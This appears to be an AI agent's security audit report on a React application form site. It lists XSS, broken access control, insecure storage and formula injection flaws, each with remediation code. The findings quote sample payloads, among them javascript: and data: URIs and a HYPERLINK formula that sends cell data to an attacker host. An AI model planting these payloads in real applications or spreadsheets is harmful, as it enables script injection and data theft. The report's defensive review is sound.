# Frontend Security Code Review Handoff Report

**Agent**: Explorer 2 (Frontend Security Auditor)  
**Date**: 2026-09-04  
**Target**: Frontend Codebase (`src/`, `vite.config.ts`, `package.json`, `index.html`, and related configuration)  
**Workspace**: `D:\ariza\Markaz form`  
**Report Type**: Hard Handoff (Investigation Complete)

---

## 1. Observation

A systematic static code analysis was conducted across all files within `src/` (components, pages, store, api, lib, router, types, assets) and frontend configuration files (`vite.config.ts`, `package.json`, `index.html`, `.cpanel.yml`, `.env.production`).

### Summary of Discovered Vulnerabilities

| ID | Title | Severity | OWASP Top 10 Category | Affected File(s) & Line(s) |
|---|---|---|---|---|
| **VULN-FE-01** | Full Applicant PII Database Stored in Unencrypted LocalStorage | **Critical** | A02:2021-Cryptographic Failures / CWE-312 | `src/store/dataStore.tsx:11, 154-156, 178-188, 212-218`<br>`src/pages/public/TrackApplicationPage.tsx:17, 33` |
| **VULN-FE-02** | Stored Cross-Site Scripting (XSS) via `javascript:` URI in Application File Links | **Critical** | A03:2021-Injection / CWE-79 | `src/pages/admin/ApplicationsPage.tsx:401, 406, 411` |
| **VULN-FE-03** | Absence of Client-Side Role-Based Route Guards (Moderator Privilege Escalation) | **High** | A01:2021-Broken Access Control / CWE-285 | `src/router/index.tsx:35-49`<br>`src/components/layout/AdminLayout.tsx:7-8`<br>`src/pages/admin/AdministratorsPage.tsx:48-269`<br>`src/pages/admin/SettingsAdminPage.tsx:11-139`<br>`src/components/layout/AdminSidebar.tsx:47-50` |
| **VULN-FE-04** | DOM/Stored XSS and Unsanitized Iframe Embedding in Map URL Handler | **High** | A03:2021-Injection / CWE-79 | `src/pages/public/FAQPage.tsx:94-130` |
| **VULN-FE-05** | Insecure Storage of Access & Refresh Tokens in `localStorage` | **High** | A02:2021-Cryptographic Failures / CWE-312 | `src/store/authStore.ts:8, 15-17`<br>`src/api/client.ts:10, 50, 70` |
| **VULN-FE-06** | Ineffective Client-Side Math Captcha (Complete Bot Protection Bypass) | **High** | A04:2021-Insecure Design / CWE-602 | `src/pages/public/ApplicationFormPage.tsx:34-42, 128-132, 492-508` |
| **VULN-FE-07** | CSV / Excel Formula Injection (CWE-1236) in Applicant Data Export | **Medium** | A03:2021-Injection / CWE-1236 | `src/pages/admin/ApplicationsPage.tsx:132-154` |
| **VULN-FE-08** | Third-Party PII Leakage via Unauthenticated Google Translate API | **Medium** | A02:2021-Cryptographic Failures / CWE-359 | `src/lib/translationService.ts:104-159`<br>`src/pages/admin/ApplicationsPage.tsx:59, 85` |
| **VULN-FE-09** | Cryptographically Weak PRNG in Application ID Generation | **Medium** | A02:2021-Cryptographic Failures / CWE-338 | `src/lib/utils.ts:41-45` |
| **VULN-FE-10** | State-Changing POST Request Executed Automatically on GET Navigation | **Medium** | A04:2021-Insecure Design / CWE-352 / CWE-862 | `src/pages/admin/CheckInPage.tsx:13-24` |
| **VULN-FE-11** | Hardcoded User Accounts and PII Exposed in Production Build | **Medium** | A02:2021-Cryptographic Failures / CWE-200 | `src/lib/mockData.ts:200-338, 515-519` |
| **VULN-FE-12** | Insecure Fallback Base URL using Cleartext HTTP | **Medium** | A05:2021-Security Misconfiguration / CWE-319 | `src/api/client.ts:5, 60` |
| **VULN-FE-13** | Missing Content Security Policy (CSP) and Security Headers | **Low** | A05:2021-Security Misconfiguration / CWE-1021 | `index.html:1-56`, `vite.config.ts:1-44` |
| **VULN-FE-14** | Missing Client-Side File Size and MIME-Type Validation on Upload | **Low** | A04:2021-Insecure Design / CWE-400 | `src/pages/public/ApplicationFormPage.tsx:475-484` |
| **VULN-FE-15** | Vite Server Bound to All Network Interfaces (`0.0.0.0`) | **Low** | A05:2021-Security Misconfiguration / CWE-1385 | `vite.config.ts:34-42` |

---

### Detailed Observations and Evidence

#### VULN-FE-01: Full Applicant PII Database Stored in Unencrypted LocalStorage
- **Location**: `src/store/dataStore.tsx:11, 154-156, 178-188, 212-218`, `src/pages/public/TrackApplicationPage.tsx:17, 33`
- **Code Quoted**:
  ```ts
  // src/store/dataStore.tsx:11
  const STORAGE_KEYS = {
    EVENTS: 'centr_form_events_v2',
    FAQS: 'centr_form_faqs_v2',
    APPLICATIONS: 'centr_form_applications_v2',
  };
  ...
  // src/store/dataStore.tsx:178-188
  const fetchApplications = useCallback(async () => {
    const { token } = getStoredAuth();
    if (!token) return;
    try {
      const res = await apiClient.get('/applications/admin/');
      const rawList = extractResults(res.data);
      setApplications(rawList.map(transformApplication));
    } catch (err) {
      console.warn('Failed to fetch applications from API, using fallback data:', err);
    }
  }, []);
  ...
  // src/store/dataStore.tsx:212-218
  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.APPLICATIONS, JSON.stringify(applications));
    } catch {
      // quota exception
    }
  }, [applications]);
  ```
  ```ts
  // src/pages/public/TrackApplicationPage.tsx:17, 33
  const { applications } = useData();
  ...
  const rawFound = applications.find(a => a.applicationId.toLowerCase() === id.trim().toLowerCase());
  ```
- **Description**:
  When an administrator logs in, `fetchApplications()` retrieves all application records from `/applications/admin/`. The `useEffect` hook unconditionally persists all records into `localStorage.setItem('centr_form_applications_v2', JSON.stringify(applications))`. Each record contains sensitive personal data (full name, phone, email, date of birth, passport series/number, personal photo URL, submitted document URL, region, district, organization, position, attendance type, and internal admin comments).
  Furthermore, `clearStoredAuth()` (`src/store/authStore.ts:19-21`) only clears `centr-form-auth` on logout, leaving `centr_form_applications_v2` indefinitely on the client machine.
  On public pages like `/track`, `TrackApplicationPage.tsx` searches across `applications` in client memory instead of making a single targeted request to the backend. If a browser was previously used by an administrator or if an XSS vulnerability occurs, the entire applicant registry can be dumped with `localStorage.getItem('centr_form_applications_v2')`.

#### VULN-FE-02: Stored Cross-Site Scripting (XSS) via `javascript:` URI in Application File Links
- **Location**: `src/pages/admin/ApplicationsPage.tsx:401, 406, 411`
- **Code Quoted**:
  ```tsx
  // src/pages/admin/ApplicationsPage.tsx:399-416
  <div className="flex gap-4 flex-wrap">
    {selected.documentUrl && (
      <a href={selected.documentUrl} target="_blank" rel="noreferrer" className="flex items-center gap-1 text-sm text-[#1a56db] hover:underline">
        <Download className="w-4 h-4" /> {t('apply.docAbstract')}
      </a>
    )}
    {selected.passportUrl && (
      <a href={selected.passportUrl} target="_blank" rel="noreferrer" className="flex items-center gap-1 text-sm text-[#1a56db] hover:underline">
        <Download className="w-4 h-4" /> {t('apply.docPassport')}
      </a>
    )}
    {selected.photoUrl && (
      <a href={selected.photoUrl} target="_blank" rel="noreferrer" className="flex items-center gap-1 text-sm text-[#1a56db] hover:underline">
        <Download className="w-4 h-4" /> {t('apply.docPhoto')}
      </a>
    )}
  </div>
  ```
- **Description**:
  The application renders anchor tags with `href` set directly to `selected.documentUrl`, `selected.passportUrl`, and `selected.photoUrl`. Neither React nor the application code performs URL scheme validation. If an applicant supplies a URL beginning with `javascript:` (e.g. `javascript:eval(atob('...'))`), clicking any of these download links inside the admin modal executes arbitrary JavaScript in the context of the authenticated administrator session, leading to complete session hijacking and account takeover.

#### VULN-FE-03: Absence of Client-Side Role-Based Route Guards (Moderator Privilege Escalation)
- **Location**:
  - `src/router/index.tsx:35-49`
  - `src/components/layout/AdminLayout.tsx:7-8`
  - `src/components/layout/AdminSidebar.tsx:47-50`
  - `src/pages/admin/AdministratorsPage.tsx:48-269`
  - `src/pages/admin/SettingsAdminPage.tsx:11-139`
- **Code Quoted**:
  ```tsx
  // src/components/layout/AdminLayout.tsx:7-8
  export default function AdminLayout() {
    const { isAuthenticated } = useAuth();
    if (!isAuthenticated) return <Navigate to="/admin/login" replace />;
  ...
  ```
  ```tsx
  // src/components/layout/AdminSidebar.tsx:47-50
  // Moderators should not see Administrators and Settings
  if (user?.role === 'moderator' && (to === '/admin/administrators' || to === '/admin/settings')) {
    return null;
  }
  ```
- **Description**:
  The application intended to restrict `moderator` accounts from accessing `/admin/administrators` and `/admin/settings` (as documented in `UpdatesPage.tsx:26` and `AdminSidebar.tsx:48`). However, access control was implemented purely as "security through obscurity" by hiding links in the sidebar. `AdminLayout.tsx` checks only `isAuthenticated`. Neither `router/index.tsx`, `AdminLayout.tsx`, `AdministratorsPage.tsx`, nor `SettingsAdminPage.tsx` checks the user's role.
  A user with the `moderator` role can manually enter `/admin/administrators` or `/admin/settings` in the address bar. Upon navigation, `AdministratorsPage` mounts, requests `/accounts/users/`, and displays the admin management interface, enabling moderators to edit existing users, modify passwords, and elevate their role to `super_admin`.

#### VULN-FE-04: DOM/Stored XSS and Unsanitized Iframe Embedding in Map URL Handler
- **Location**: `src/pages/public/FAQPage.tsx:94-130`
- **Code Quoted**:
  ```tsx
  // src/pages/public/FAQPage.tsx:94-130
  {(() => {
    const raw = (settings?.map_url || "").trim();
    let parsedUrl = raw;
    if (raw.toLowerCase().includes('<iframe')) {
      const match = raw.match(/src=["']([^"']+)["']/i);
      if (match) parsedUrl = match[1];
    }
    
    if (!parsedUrl) {
      parsedUrl = "https://www.google.com/maps/embed?...";
    }

    if (parsedUrl.includes('embed') || parsedUrl.includes('output=embed')) {
      return (
        <iframe
          src={parsedUrl}
          width="100%"
          height="100%"
          style={{ border: 0 }}
          allowFullScreen
          loading="lazy"
          referrerPolicy="no-referrer-when-downgrade"
          title="Location Map"
        />
      );
    } else {
      return (
        <div className="text-center p-4">
          <MapPin className="w-12 h-12 text-[#1a56db] mx-auto mb-2" />
          <p className="text-sm text-slate-600 mb-4">Xarita o'rniga oddiy havola kiritilgan.</p>
          <a href={parsedUrl} target="_blank" rel="noopener noreferrer" className="bg-[#1a56db] text-white px-4 py-2 rounded-lg text-sm">
            Xaritada ochish
          </a>
        </div>
      );
    }
  })()}
  ```
- **Description**:
  The application parses `settings?.map_url` by regex or raw string without enforcing that the protocol is `https:`.
  1. If `parsedUrl` does not contain `embed`, it is rendered as `<a href={parsedUrl}>`. If `parsedUrl` starts with `javascript:`, clicking "Xaritada ochish" triggers client-side script execution for any visitor to `/faq`.
  2. If `parsedUrl` contains `embed` (e.g., `data:text/html,<script>alert(1)</script>?embed`), it is embedded in an `<iframe>` without sandbox restrictions (`sandbox` attribute missing), allowing arbitrary content framing.

#### VULN-FE-05: Insecure Storage of Access & Refresh Tokens in `localStorage`
- **Location**: `src/store/authStore.ts:8, 15-17, 70-75`, `src/api/client.ts:10, 50, 70`
- **Code Quoted**:
  ```ts
  // src/store/authStore.ts:4-17
  const AUTH_KEY = 'centr-form-auth';

  export function getStoredAuth(): { user: AdminUser | null; token: string | null; refreshToken: string | null } {
    try {
      const raw = localStorage.getItem(AUTH_KEY);
      return raw ? JSON.parse(raw) : { user: null, token: null, refreshToken: null };
    } catch {
      return { user: null, token: null, refreshToken: null };
    }
  }

  export function setStoredAuth(user: AdminUser, token: string, refreshToken: string) {
    localStorage.setItem(AUTH_KEY, JSON.stringify({ user, token, refreshToken }));
  }
  ```
- **Description**:
  Both the JWT access token and the refresh token are stored in browser `localStorage`. Any XSS flaw on the domain allows an attacker to execute `localStorage.getItem('centr-form-auth')` and obtain tokens that persist even after browser closure. Additionally, `src/api/client.ts:70-74` writes raw JSON directly into `localStorage` during refresh operations without encapsulation.

#### VULN-FE-06: Ineffective Client-Side Math Captcha (Complete Bot Protection Bypass)
- **Location**: `src/pages/public/ApplicationFormPage.tsx:34-42, 128-132, 492-508`
- **Code Quoted**:
  ```tsx
  // src/pages/public/ApplicationFormPage.tsx:34-42
  const [captchaNum1, setCaptchaNum1] = useState(0);
  const [captchaNum2, setCaptchaNum2] = useState(0);
  const [captchaInput, setCaptchaInput] = useState('');
  const [captchaError, setCaptchaError] = useState(false);

  useEffect(() => {
    setCaptchaNum1(Math.floor(Math.random() * 10) + 1);
    setCaptchaNum2(Math.floor(Math.random() * 10) + 1);
  }, []);
  ...
  // src/pages/public/ApplicationFormPage.tsx:128-132
  const onSubmit = async (data: FormData) => {
    if (parseInt(captchaInput) !== (captchaNum1 + captchaNum2)) {
      setCaptchaError(true);
      toast.error(t('apply.captchaError') || "Xavfsizlik savoliga noto'g'ri javob berdingiz.");
      return;
    }
    setCaptchaError(false);
  ...
  ```
- **Description**:
  `UpdatesPage.tsx:73` advertises: "Ariza yuborish sahifasiga Matematik Captcha kiritildi. Endilikda tizim turli xil spam botlardan to'liq himoyalangan."
  However, this control exists entirely in client-side React state. The numbers are generated client-side and verified client-side. The backend API `/applications/submit/` receives a standard `FormData` payload without any captcha challenge ID, signed token, or server-verified proof of work. Any bot transmitting HTTP POST requests directly to `/api/v1/applications/submit/` bypasses this control completely.

#### VULN-FE-07: CSV / Excel Formula Injection (CWE-1236) in Applicant Data Export
- **Location**: `src/pages/admin/ApplicationsPage.tsx:132-154`
- **Code Quoted**:
  ```tsx
  // src/pages/admin/ApplicationsPage.tsx:132-154
  const handleExportExcel = () => {
    const exportData = filtered.map(app => ({
      'ID': app.applicationId,
      [t('apply.fullName')]: app.fullName,
      [t('apply.organization')]: app.organization,
      [t('apply.position')]: app.position,
      [t('apply.email')]: app.email,
      [t('apply.phone')]: app.phone,
      [t('apply.country') || 'Mamlakat']: app.country,
      [t('apply.region')]: app.regionName,
      [t('apply.district')]: app.districtName,
      [t('apply.event')]: app.eventTitle,
      [t('apply.presentationTitle')]: app.presentationTitle || "Yo'q",
      [t('appsAdmin.colStatus')]: getApplicationStatusLabel(app.status, language),
      [t('track.submittedDate')]: formatDate(app.submittedAt, language),
    }));

    const worksheet = XLSX.utils.json_to_sheet(exportData);
    const workbook = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(workbook, worksheet, 'Arizalar');
    XLSX.writeFile(workbook, `Arizalar_${new Date().toISOString().split('T')[0]}.xlsx`);
  ```
- **Description**:
  `exportData` maps user-supplied strings directly into worksheet cells. If an untrusted applicant inputs a name or title starting with `=cmd|'/C calc'!A0`, `=HYPERLINK("http://attacker.com/leak?data="&A1)`, `@`, `+`, or `-`, spreadsheet applications (Excel, Calc) will treat the value as an executable formula upon opening the exported file.

#### VULN-FE-08: Third-Party PII Leakage via Unauthenticated Google Translate API
- **Location**: `src/lib/translationService.ts:136-156`, `src/pages/admin/ApplicationsPage.tsx:59, 85`
- **Code Quoted**:
  ```ts
  // src/lib/translationService.ts:136-156
  // 4. Online Translation API (Google Translate free endpoint)
  try {
    const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=${sourceLanguage}&tl=${targetLanguage}&dt=t&q=${encodeURIComponent(text)}`;
    const response = await fetch(url);
    if (response.ok) {
      const data = await response.json();
      if (Array.isArray(data) && Array.isArray(data[0])) {
        const translatedText = data[0].map((item: any) => item[0]).filter(Boolean).join('');
        if (translatedText) {
          translationCache.set(cacheKey, translatedText);
          try {
            localStorage.setItem(`t_cache_${cacheKey}`, translatedText);
          } catch {
            // Storage quota full
          }
          return translatedText;
        }
      }
    }
  } catch (error) {
    console.warn('Online translation request failed, returning original text:', error);
  }
  ```
- **Description**:
  When an administrator triggers auto-translation or saves an application status change with comments (`ApplicationsPage.tsx:59, 85`), the text is sent via cleartext query parameters to `https://translate.googleapis.com/translate_a/single`. Confidential administrative comments and candidate assessments are exposed to a public, third-party unauthenticated endpoint without authorization, data processing agreements, or user consent. Furthermore, these comments are stored permanently in the user's `localStorage` (`t_cache_*`).

#### VULN-FE-09: Cryptographically Weak PRNG in Application ID Generation
- **Location**: `src/lib/utils.ts:41-45`
- **Code Quoted**:
  ```ts
  // src/lib/utils.ts:41-45
  export function generateApplicationId(): string {
    const year = new Date().getFullYear();
    const num = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
    return `CF-${year}-${num}`;
  }
  ```
- **Description**:
  `Math.random()` is not cryptographically secure (CWE-338). Generating IDs using a 6-digit integer provides only 1,000,000 combinations. An attacker can predict sequences or brute-force application IDs to query application status and view candidate attendance and details.

#### VULN-FE-10: State-Changing POST Request Executed Automatically on GET Navigation
- **Location**: `src/pages/admin/CheckInPage.tsx:13-24`
- **Code Quoted**:
  ```tsx
  // src/pages/admin/CheckInPage.tsx:13-24
  useEffect(() => {
    if (!id) return;
    
    apiClient.post(`/applications/admin/${id}/check-in/`)
      .then((res) => {
        setStatus('success');
      })
      .catch((err) => {
        setStatus('error');
        setMessage(err.response?.data?.message || 'Check-in failed');
      });
  }, [id]);
  ```
- **Description**:
  Merely navigating to `/admin/check-in/:id` initiates a state-altering mutation (`POST /applications/admin/${id}/check-in/`) inside React's `useEffect`. There is no confirmation step. An authenticated admin following a link, previewing a URL, or being redirected by an external site will trigger the participant check-in unintentionally.

#### VULN-FE-11: Hardcoded User Accounts and PII Exposed in Production Build
- **Location**: `src/lib/mockData.ts:200-338, 515-519`
- **Code Quoted**:
  ```ts
  // src/lib/mockData.ts:515-519
  export const MOCK_ADMIN_USERS: AdminUser[] = [
    { id: 1, username: "superadmin", fullName: "Aliyev Behruz Mansur o'g'li", email: "b.aliyev@akademiya.uz", role: "super_admin", isActive: true, createdAt: "2025-01-01", lastLogin: "2026-08-04T08:30:00" },
    { id: 2, username: "admin1", fullName: "Rahimova Zulfiya Hamidovna", email: "z.rahimova@akademiya.uz", role: "administrator", isActive: true, createdAt: "2025-03-15", lastLogin: "2026-08-03T17:00:00" },
    { id: 3, username: "moderator1", fullName: "Xasanov Jahongir Akbar o'g'li", email: "j.xasanov@akademiya.uz", role: "moderator", isActive: true, createdAt: "2025-06-01", lastLogin: "2026-08-04T07:45:00" },
  ];
  ```
- **Description**:
  `MOCK_ADMIN_USERS` and `MOCK_APPLICATIONS` contain usernames, real internal domain emails (`@akademiya.uz`), user roles, phone numbers, and applicant descriptions. Because `mockData.ts` is imported by `dataStore.tsx` and `DashboardPage.tsx`, all mock records are compiled into the production bundle (`dist/assets/index-*.js`), leaking administrative email addresses and organizational accounts to anyone inspecting client assets.

#### VULN-FE-12: Insecure Fallback Base URL using Cleartext HTTP
- **Location**: `src/api/client.ts:5, 60`
- **Code Quoted**:
  ```ts
  // src/api/client.ts:5
  export const apiClient = axios.create({
    baseURL: import.meta.env.VITE_API_URL || 'http://localhost:8000/api/v1',
    headers: { 'Content-Type': 'application/json' },
  });
  ...
  // src/api/client.ts:60
  const baseURL = import.meta.env.VITE_API_URL || 'http://localhost:8000/api/v1';
  ```
- **Description**:
  If the `VITE_API_URL` environment variable is omitted during deployment, the client falls back to `http://localhost:8000/api/v1`. On non-HTTPS staging or misconfigured deployments, authentication headers (`Authorization: Bearer <jwt>`) are transmitted over unencrypted HTTP.

#### VULN-FE-13: Missing Content Security Policy (CSP) and Security Headers
- **Location**: `index.html:1-56`, `vite.config.ts:1-44`
- **Description**:
  `index.html` does not declare a `<meta http-equiv="Content-Security-Policy" ...>` tag. There is no restriction on script execution origins, connect endpoints, object elements, or frame ancestors, leaving the application vulnerable to frame embedding (clickjacking) and simplifying script execution if XSS vectors are triggered.

#### VULN-FE-14: Missing Client-Side File Size and MIME-Type Validation on Upload
- **Location**: `src/pages/public/ApplicationFormPage.tsx:475-484`
- **Code Quoted**:
  ```tsx
  // src/pages/public/ApplicationFormPage.tsx:475-484
  <input
    type="file"
    accept={accept}
    className="hidden"
    onChange={(e) => {
      const file = e.target.files?.[0];
      if (file) setFiles(f => ({ ...f, [key]: file }));
    }}
  />
  ```
- **Description**:
  The file input validates neither `file.size` nor file magic bytes before storing it in state and submitting multipart form data. Selecting multi-gigabyte files can lead to client memory exhaustion and upload denial-of-service.

#### VULN-FE-15: Vite Server Bound to All Network Interfaces (`0.0.0.0`)
- **Location**: `vite.config.ts:34-42`
- **Code Quoted**:
  ```ts
  // vite.config.ts:33-43
  server: {
    host: '0.0.0.0',
    port: parseInt(process.env.PORT || '8443'),
    strictPort: true,
    watch: { ignored: ['**/.figma/**'] },
  },
  preview: {
    host: '0.0.0.0',
    port: parseInt(process.env.PORT || '8443'),
  },
  ```
- **Description**:
  Binding development and preview servers to `0.0.0.0` exposes them on all network interfaces. In local development or shared Wi-Fi networks, unauthorized third parties on the same network can access the running development application.

---

## 2. Logic Chain

The step-by-step analytical reasoning from observations to vulnerability conclusions is structured as follows:

```
[Observation 1: dataStore.tsx stores all applications in localStorage; TrackApplicationPage searches this store]
       ↓
(Logic Step 1: Any user accessing the browser or any script executing in origin can read localStorage)
       ↓
[Conclusion 1: VULN-FE-01 - Critical PII data exposure; persistent cleartext database leak]

[Observation 2: ApplicationsPage.tsx renders <a href={selected.documentUrl}> without scheme validation]
       ↓
(Logic Step 2: React does not block javascript: URLs in <a> href; untrusted URLs execute JS on click)
       ↓
[Conclusion 2: VULN-FE-02 - Critical Stored XSS in admin console]

[Observation 3: AdminLayout.tsx only tests isAuthenticated; AdministratorsPage.tsx does not check role]
       ↓
(Logic Step 3: AdminSidebar.tsx merely hides UI elements; URL routes remain fully accessible to moderators)
       ↓
[Conclusion 3: VULN-FE-03 - High severity privilege escalation and broken access control]

[Observation 4: FAQPage.tsx accepts settings.map_url and injects into iframe / a href without protocol check]
       ↓
(Logic Step 4: map_url with javascript: scheme executes script upon link click; embed query frames arbitrary URLs)
       ↓
[Conclusion 4: VULN-FE-04 - High severity DOM/Stored XSS]

[Observation 5: authStore.ts stores tokens in localStorage; clearStoredAuth only clears auth key]
       ↓
(Logic Step 5: localStorage is accessible to any script in document context; tokens cannot be protected with HttpOnly)
       ↓
[Conclusion 5: VULN-FE-05 - High severity token storage insecurity]

[Observation 6: ApplicationFormPage.tsx generates and checks captcha math in React component state only]
       ↓
(Logic Step 6: Backend endpoint /applications/submit/ receives no captcha proof; client checks are easily bypassed by bots)
       ↓
[Conclusion 6: VULN-FE-06 - High severity ineffective security mechanism]

[Observation 7: ApplicationsPage.tsx exports raw fields to XLSX.utils.json_to_sheet]
       ↓
(Logic Step 7: Spreadsheet applications evaluate cells starting with =, +, -, @ as dynamic formulas)
       ↓
[Conclusion 7: VULN-FE-07 - Medium severity formula injection]

[Observation 8: translationService.ts queries public Google endpoint and stores in t_cache_*]
       ↓
(Logic Step 8: Evaluator comments regarding applicants are transmitted across public internet to third-party)
       ↓
[Conclusion 8: VULN-FE-08 - Medium severity third-party PII leakage]

[Observation 9: utils.ts uses Math.random() to create 6-digit numeric IDs]
       ↓
(Logic Step 9: Math.random() is PRNG; 6 digits has low entropy (10^6), enabling enumeration)
       ↓
[Conclusion 9: VULN-FE-09 - Medium severity predictability flaw]

[Observation 10: CheckInPage.tsx invokes POST inside useEffect on component mount]
       ↓
(Logic Step 10: GET requests should be idempotent; automatic execution without confirmation allows forced check-ins)
       ↓
[Conclusion 10: VULN-FE-10 - Medium severity CSRF-like state mutation]
```

---

## 3. Caveats

1. **Backend Verification Scope**: This investigation evaluated frontend code (`src/` and frontend configs). Backend DRF endpoints (`backend/`) were inspected only to verify contract interactions. Backend rate limiting and database authorization checks are reviewed independently by the Backend Security Explorer.
2. **Dynamic Penetration Testing**: Analysis was conducted via static code auditing, AST/code-path tracing, and build compilation verification. No live weaponized payloads or network attacks were launched against running servers.
3. **Browser Compatibility Assumptions**: Modern browser security mitigations (such as Chromium auto-blocking top-level navigation to `javascript:` URLs in certain instances) were considered, but standard OWASP guidelines mandate defensive sanitization within the application source code regardless of client browser vendor.

---

## 4. Conclusion & Recommended Defensive Remediations

To harden the frontend application against OWASP Top 10 vulnerabilities, the following defensive code changes must be implemented.

### Remediation Code Snippets

#### Fix for VULN-FE-01: Remove Sensitive PII from LocalStorage & Decouple Public Tracking
**File**: `src/store/dataStore.tsx`
```tsx
// BEFORE (Lines 212-218)
useEffect(() => {
  try {
    localStorage.setItem(STORAGE_KEYS.APPLICATIONS, JSON.stringify(applications));
  } catch {
    // quota exception
  }
}, [applications]);

// AFTER
// Do not persist application records in localStorage.
// Keep applications strictly in memory for authenticated administrative sessions.
useEffect(() => {
  // Clear any legacy sensitive applications data from localStorage
  try {
    localStorage.removeItem(STORAGE_KEYS.APPLICATIONS);
  } catch {}
}, []);
```
**File**: `src/pages/public/TrackApplicationPage.tsx`
```tsx
// BEFORE (Lines 33-35)
const rawFound = applications.find(a => a.applicationId.toLowerCase() === id.trim().toLowerCase());
setResult(rawFound ? getTranslatedContent(rawFound, language) : 'not_found');

// AFTER
// Fetch tracking details on-demand from dedicated backend tracking endpoint:
const handleSearch = async (id: string) => {
  if (!id.trim()) return;
  setLoading(true);
  setSearchParams({ id });
  try {
    const res = await apiClient.get(`/applications/track/?id=${encodeURIComponent(id.trim())}`);
    setResult(getTranslatedContent(transformApplication(res.data), language));
  } catch (err) {
    setResult('not_found');
  } finally {
    setLoading(false);
  }
};
```

#### Fix for VULN-FE-02: Sanitize URL Schemes for Application Attachments
**File**: `src/lib/utils.ts` (Add helper)
```ts
export function sanitizeUrl(url: string | undefined | null): string {
  if (!url) return '';
  const trimmed = url.trim();
  const allowedProtocols = ['http:', 'https:'];
  try {
    // Handle relative paths safely
    if (trimmed.startsWith('/') || trimmed.startsWith('./')) {
      return trimmed;
    }
    const parsed = new URL(trimmed);
    if (allowedProtocols.includes(parsed.protocol)) {
      return trimmed;
    }
  } catch {
    return '';
  }
  return '';
}
```
**File**: `src/pages/admin/ApplicationsPage.tsx`
```tsx
// BEFORE (Lines 400-415)
{selected.documentUrl && (
  <a href={selected.documentUrl} target="_blank" rel="noreferrer" ...>
...

// AFTER
{sanitizeUrl(selected.documentUrl) && (
  <a href={sanitizeUrl(selected.documentUrl)} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-sm text-[#1a56db] hover:underline">
    <Download className="w-4 h-4" /> {t('apply.docAbstract')}
  </a>
)}
{sanitizeUrl(selected.passportUrl) && (
  <a href={sanitizeUrl(selected.passportUrl)} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-sm text-[#1a56db] hover:underline">
    <Download className="w-4 h-4" /> {t('apply.docPassport')}
  </a>
)}
{sanitizeUrl(selected.photoUrl) && (
  <a href={sanitizeUrl(selected.photoUrl)} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-sm text-[#1a56db] hover:underline">
    <Download className="w-4 h-4" /> {t('apply.docPhoto')}
  </a>
)}
```

#### Fix for VULN-FE-03: Implement Client-Side Role-Based Route Guards
**File**: Create `src/components/layout/RoleRouteGuard.tsx`
```tsx
import { Navigate, Outlet } from 'react-router-dom';
import { useAuth } from '../../store/authStore';
import type { UserRole } from '../../types';

interface RoleRouteGuardProps {
  allowedRoles: UserRole[];
  redirectPath?: string;
}

export default function RoleRouteGuard({ allowedRoles, redirectPath = '/admin' }: RoleRouteGuardProps) {
  const { user, isAuthenticated } = useAuth();
  
  if (!isAuthenticated) {
    return <Navigate to="/admin/login" replace />;
  }

  if (!user || !allowedRoles.includes(user.role)) {
    return <Navigate to={redirectPath} replace />;
  }

  return <Outlet />;
}
```
**File**: `src/router/index.tsx`
```tsx
// BEFORE (Lines 42-45)
{ path: 'administrators', element: <AdministratorsPage /> },
{ path: 'settings', element: <SettingsAdminPage /> },

// AFTER
{
  element: <RoleRouteGuard allowedRoles={['super_admin', 'administrator']} />,
  children: [
    { path: 'administrators', element: <AdministratorsPage /> },
    { path: 'settings', element: <SettingsAdminPage /> },
  ],
},
```
Additionally, check `user?.role === 'super_admin'` inside `AdministratorsPage.tsx` before allowing user creation or deletion.

#### Fix for VULN-FE-04: Validate Protocol and Sandbox Embeds in FAQPage
**File**: `src/pages/public/FAQPage.tsx`
```tsx
// BEFORE (Lines 94-117)
const raw = (settings?.map_url || "").trim();
let parsedUrl = raw;
if (raw.toLowerCase().includes('<iframe')) {
  const match = raw.match(/src=["']([^"']+)["']/i);
  if (match) parsedUrl = match[1];
}
...

// AFTER
let safeMapUrl = '';
const raw = (settings?.map_url || "").trim();
if (raw.toLowerCase().includes('<iframe')) {
  const match = raw.match(/src=["']([^"']+)["']/i);
  if (match) safeMapUrl = match[1];
} else {
  safeMapUrl = raw;
}

// Ensure protocol is strictly HTTPS
try {
  const parsed = new URL(safeMapUrl);
  if (parsed.protocol !== 'https:') {
    safeMapUrl = '';
  }
} catch {
  safeMapUrl = '';
}

if (!safeMapUrl) {
  safeMapUrl = "https://www.google.com/maps/embed?pb=!1m18!...";
}

if (safeMapUrl.includes('embed') || safeMapUrl.includes('output=embed')) {
  return (
    <iframe
      src={safeMapUrl}
      width="100%"
      height="100%"
      style={{ border: 0 }}
      allowFullScreen
      loading="lazy"
      sandbox="allow-scripts allow-same-origin allow-popups"
      referrerPolicy="no-referrer-when-downgrade"
      title="Location Map"
    />
  );
} else {
  return (
    <div className="text-center p-4">
      <MapPin className="w-12 h-12 text-[#1a56db] mx-auto mb-2" />
      <p className="text-sm text-slate-600 mb-4">Xarita havolasi:</p>
      <a href={safeMapUrl} target="_blank" rel="noopener noreferrer" className="bg-[#1a56db] text-white px-4 py-2 rounded-lg text-sm">
        Xaritada ochish
      </a>
    </div>
  );
}
```

#### Fix for VULN-FE-06: Replace Client-Side Math Captcha with Server-Validated Captcha / Token
**File**: `src/pages/public/ApplicationFormPage.tsx`
```tsx
// The math captcha must either receive a signed challenge token from Django:
// GET /api/v1/auth/captcha/ -> { token: "...", question: "5 + 7 = ?" }
// And submit: formData.append('captcha_token', token); formData.append('captcha_answer', answer);
// Or use standard Cloudflare Turnstile / reCAPTCHA widget where verification is completed server-side.
```

#### Fix for VULN-FE-07: Sanitize Excel Export Values
**File**: `src/pages/admin/ApplicationsPage.tsx`
```tsx
// BEFORE (Lines 133-147)
const exportData = filtered.map(app => ({
  'ID': app.applicationId,
  [t('apply.fullName')]: app.fullName,
...

// AFTER
// Sanitize formula injection triggers (=, +, -, @, \t, \r)
const sanitizeFormula = (val: string | undefined | null) => {
  if (!val) return '';
  const str = String(val);
  if (/^[=+\-@\t\r]/.test(str)) {
    return `'${str}`;
  }
  return str;
};

const exportData = filtered.map(app => ({
  'ID': sanitizeFormula(app.applicationId),
  [t('apply.fullName')]: sanitizeFormula(app.fullName),
